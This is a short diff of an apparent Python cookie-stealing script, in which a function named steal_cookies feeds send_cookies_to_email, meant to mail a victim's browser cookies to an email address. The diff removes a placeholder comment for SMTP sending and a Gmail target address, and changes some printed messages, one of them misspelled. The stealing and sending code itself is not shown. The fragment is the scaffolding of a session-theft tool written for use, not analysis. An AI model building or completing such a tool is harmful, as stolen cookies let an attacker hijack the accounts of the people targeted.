@@ -32,11 +32,8 @@ def steal_cookies():
 def send_cookies_to_email(email):
     cookies = steal_cookies()
     if cookies:
-        # Send cookies to email
-        # (code to send cookies via email using SMTP)
-        print("success:", email)
+        print("secess:", email)
     else:
-        print("404 error...")
+        print("404 not found .")
 
-# Replace 'your_email@example.com' with the victim's email
-send_cookies_to_email('kkara9009@gmail.com')
+send_cookies_to_email('kkara9009')
